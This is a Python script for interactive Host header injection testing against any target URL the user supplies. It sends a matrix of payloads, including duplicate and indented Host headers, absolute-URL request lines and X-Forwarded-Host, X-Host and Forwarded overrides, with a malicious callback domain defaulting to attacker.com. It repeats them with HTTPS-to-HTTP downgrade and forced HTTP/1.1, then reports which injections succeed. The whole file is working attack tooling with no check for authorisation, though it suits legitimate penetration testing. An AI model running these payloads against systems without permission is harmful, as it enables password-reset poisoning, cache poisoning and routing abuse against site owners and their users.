# -*- coding: utf-8 -*-
"""
Interactive Host Header Injection Tester (Final)
- Implements PortSwigger techniques:
  * Flawed validation: non-numeric port, arbitrary subdomain, compromised subdomain
  * Duplicate Host headers
  * Absolute URL in request line (HTTP/HTTPS)
  * Line wrapping (indented Host)
  * Host override headers (X-Forwarded-Host, X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded)
- Malicious callback domain: used for reflection checks in Location/body
- Subdomain keyword: if present in redirect host or body, counts as success (subdomain manipulation finding)
- Interactive prompts for URL, auth, extra headers, downgrades
- Runs attacks in Normal, Downgraded to HTTP, and Forced HTTP/1.1 modes
- Outputs grouped, color-coded summaries: Success -> Interest -> Fail
- Saves JSON report with detailed results
"""

import json
import time
from typing import Dict, Any, List, Tuple, Optional
from urllib.parse import urlparse

import httpx  # pip install httpx

try:
    from colorama import init as colorama_init, Fore, Style  # pip install colorama
    colorama_init()
    COLOR_ENABLED = True
except Exception:
    COLOR_ENABLED = False
    class Dummy: pass
    Fore = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Style.RESET_ALL = ""

# ---------- Utility ----------

def color(text, c):
    if not COLOR_ENABLED:
        return text
    return c + text + Style.RESET_ALL

def target_components(url: str) -> Tuple[str, str, int, str]:
    u = urlparse(url)
    scheme = u.scheme or "https"
    host = u.hostname or ""
    port = u.port or (443 if scheme == "https" else 80)
    path = (u.path or "/") + (("?" + u.query) if u.query else "")
    return scheme, host, port, path

def extract_hostname_from_location(location: Optional[str]) -> Optional[str]:
    if not location:
        return None
    try:
        return urlparse(location).hostname
    except Exception:
        return None

# ---------- Classification ----------

def classify_result(
    status: Optional[int],
    location: Optional[str],
    body_snippet: str,
    injected_host: str,
    subdomain_keyword: str
) -> Tuple[str, str]:
    host_in_location = extract_hostname_from_location(location)

    if location and injected_host and injected_host in location:
        return "success", "Redirect reflects injected host"
    if status == 200 and injected_host and injected_host in body_snippet:
        return "success", "Body reflects injected host"

    if subdomain_keyword:
        if host_in_location and subdomain_keyword.lower() in host_in_location.lower():
            return "success", "Redirect host contains subdomain keyword"
        if status == 200 and subdomain_keyword.lower() in body_snippet.lower():
            return "success", "Body contains subdomain keyword"

    if status in (301, 302, 303, 307, 308) and location:
        return "interesting", "Redirect observed (host not reflected)"
    if status and status >= 500:
        return "interesting", "Server error (possible differential behavior)"

    if status == 400 and "invalid host" in body_snippet.lower():
        return "fail", "Explicit invalid host"
    return "fail", "No reflection or routing change detected"

def summarize(resp: httpx.Response, injected_host: str, subdomain_keyword: str) -> Dict[str, Any]:
    status = resp.status_code if resp is not None else None
    location = resp.headers.get("Location") if resp is not None else None
    try:
        body_snippet = resp.text[:1200] if resp is not None else ""
    except Exception:
        body_snippet = ""
    verdict, reason = classify_result(status, location, body_snippet, injected_host, subdomain_keyword)
    return {
        "status": status,
        "location": location,
        "verdict": verdict,
        "reason": reason
    }

# ---------- Inputs ----------

def build_base_headers(auth_choice: str) -> Dict[str, str]:
    headers = {"User-Agent": "HostHeaderInject/Interactive", "Accept": "*/*"}
    if auth_choice == "bearer":
        token = input("Enter Bearer token: ").strip()
        headers["Authorization"] = "Bearer " + token
    elif auth_choice == "cookie":
        cookie = input("Enter Cookie string: ").strip()
        headers["Cookie"] = cookie
    extra = input("Any extra headers? (key:value, comma separated, or leave blank): ").strip()
    if extra:
        for kv in extra.split(","):
            if ":" in kv:
                k, v = kv.split(":", 1)
                headers[k.strip()] = v.strip()
    return headers

def attack_matrix(target_host: str, injected_host: str, subdomain_keyword: str) -> List[Dict[str, Any]]:
    return [
        {"name": "Host with non-numeric port", "headers": {"Host": f"{target_host}:bad-stuff-here"}},
        {"name": "Host arbitrary subdomain", "headers": {"Host": f"not{target_host}"}},
        # Use keyword (default attacker) for compromised subdomain
        {"name": "Host compromised subdomain", "headers": {"Host": f"{subdomain_keyword}.{target_host}"}},

        {"name": "Duplicate Host (front-end first)", "headers": [("Host", target_host), ("Host", injected_host)]},
        {"name": "Duplicate Host (back-end first)", "headers": [("Host", injected_host), ("Host", target_host)]},

        {"name": "Absolute URL HTTPS", "headers": {"Host": injected_host}, "request_line_override": f"https://{target_host}/"},
        {"name": "Absolute URL HTTP", "headers": {"Host": injected_host}, "request_line_override": f"http://{target_host}/"},

        {"name": "Indented Host then normal", "headers": [(" Host", injected_host), ("Host", target_host)]},
        {"name": "Normal Host then indented", "headers": [("Host", target_host), (" Host", injected_host)]},

        {"name": "X-Forwarded-Host override", "headers": {"Host": target_host, "X-Forwarded-Host": injected_host}},
        {"name": "X-Host override", "headers": {"Host": target_host, "X-Host": injected_host}},
        {"name": "X-Forwarded-Server override", "headers": {"Host": target_host, "X-Forwarded-Server": injected_host}},
        {"name": "X-HTTP-Host-Override", "headers": {"Host": target_host, "X-HTTP-Host-Override": injected_host}},
        {"name": "Forwarded header host=", "headers": {"Host": target_host, "Forwarded": f"host={injected_host}"}},
    ]

# ---------- Execution ----------

def run_attacks(
    client: httpx.Client,
    scheme: str,
    host: str,
    port: int,
    path: str,
    attacks: List[Dict[str, Any]],
    injected_host: str,
    subdomain_keyword: str,
    mode_label: str
) -> List[Dict[str, Any]]:
    print(color(f"\n[+] Running attacks under mode: {mode_label}", Fore.YELLOW))
    results = []
    for attack in attacks:
        name = attack["name"]
        try:
            req_url = f"{scheme}://{host}:{port}{path}"
            absolute = attack.get("request_line_override")
            url_for_request_line = absolute if absolute else req_url
            resp = client.get(url_for_request_line, headers=attack["headers"])
            res = summarize(resp, injected_host, subdomain_keyword)
        except Exception as e:
            res = {"status": None, "location": None, "verdict": "fail", "reason": f"error: {str(e)}"}
        entry = {
            "attack": name,
            "status": res["status"],
            "location": res["location"],
            "verdict": res["verdict"],
            "reason": res["reason"],
            "mode": mode_label
        }
        results.append(entry)
    return results

def group_and_print_results(results: List[Dict[str, Any]]):
    success = [r for r in results if r["verdict"] == "success"]
    interest = [r for r in results if r["verdict"] == "interesting"]
    fail = [r for r in results if r["verdict"] == "fail"]

    print(color("\n=== Successful attacks ===", Fore.GREEN))
    for r in success:
        print(color(f"[SUCCESS] {r['attack']:30s} | {r['status']} | {r['reason']} | Mode: {r['mode']}", Fore.GREEN))
        if r.get("location"):
            print(f"          Location: {r['location']}")

    print(color("\n=== Possible attacks (Interest) ===", Fore.YELLOW))
    for r in interest:
        print(color(f"[INTEREST] {r['attack']:30s} | {r['status']} | {r['reason']} | Mode: {r['mode']}", Fore.YELLOW))
        if r.get("location"):
            print(f"          Location: {r['location']}")

    print(color("\n=== Failed attacks ===", Fore.RED))
    for r in fail:
        print(color(f"[FAIL]    {r['attack']:30s} | {r['status']} | {r['reason']} | Mode: {r['mode']}", Fore.RED))
        if r.get("location"):
            print(f"          Location: {r['location']}")

    print(f"\n[+] Summary: Success={len(success)} | Interest={len(interest)} | Fail={len(fail)} | Total={len(results)}")


def run_interactive():
    print("=== Host Header Injection Tester ===")

    # Target URL (required)
    url = input("Target URL: ").strip()
    if not url:
        print("Target URL is required.")
        return

    # Malicious callback domain (default attacker.com)
    injected_host = input("Malicious callback domain (e.g. attacker.com): ").strip()
    if not injected_host:
        injected_host = "attacker.com"

    # Subdomain keyword (default attacker)
    subdomain_keyword = input("Keyword to detect subdomain manipulation (press Enter to skip): ").strip()
    if not subdomain_keyword:
        subdomain_keyword = "attacker"

    # Authentication choice (default none)
    auth_choice = input("Do you need authentication? (none/bearer/cookie): ").strip().lower()
    if not auth_choice:
        auth_choice = "none"
    headers = build_base_headers(auth_choice)

    # Downgrade HTTPS → HTTP (default Yes)
    do_downgrade_http = input("If target is HTTPS, also try HTTP downgrade? (y/n): ").strip().lower()
    if not do_downgrade_http:
        do_downgrade_http = "y"
    do_downgrade_http = (do_downgrade_http == "y")

    # Force HTTP/1.1 (default Yes)
    force_http11 = input("Also force HTTP/1.1 (instead of HTTP/2)? (y/n): ").strip().lower()
    if not force_http11:
        force_http11 = "y"
    force_http11 = (force_http11 == "y")

    # Build attack set
    scheme, host, port, path = target_components(url)
    attacks = attack_matrix(host, injected_host, subdomain_keyword)

    all_results: List[Dict[str, Any]] = []

    # Normal mode
    client_normal = httpx.Client(headers=headers, timeout=10, follow_redirects=False)
    all_results += run_attacks(client_normal, scheme, host, port, path, attacks,
                               injected_host, subdomain_keyword, "Normal")

    # Downgraded HTTPS → HTTP
    if do_downgrade_http and scheme == "https":
        scheme_http = "http"
        port_http = 80
        client_http = httpx.Client(headers=headers, timeout=10, follow_redirects=False)
        all_results += run_attacks(client_http, scheme_http, host, port_http, path, attacks,
                                   injected_host, subdomain_keyword, "Downgraded to HTTP")

    # Forced HTTP/1.1
    if force_http11:
        client_h1 = httpx.Client(headers=headers, timeout=10, follow_redirects=False, http2=False)
        all_results += run_attacks(client_h1, scheme, host, port, path, attacks,
                                   injected_host, subdomain_keyword, "Forced HTTP/1.1")

    # Print grouped results
    group_and_print_results(all_results)

    # Save JSON report
    report = {
        "target": url,
        "injected_host": injected_host,
        "subdomain_keyword": subdomain_keyword,
        "timestamp": int(time.time()),
        "results": all_results
    }
    with open("host_inject_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    print("\n[+] Report saved to host_inject_report.json")


if __name__ == "__main__":
    run_interactive()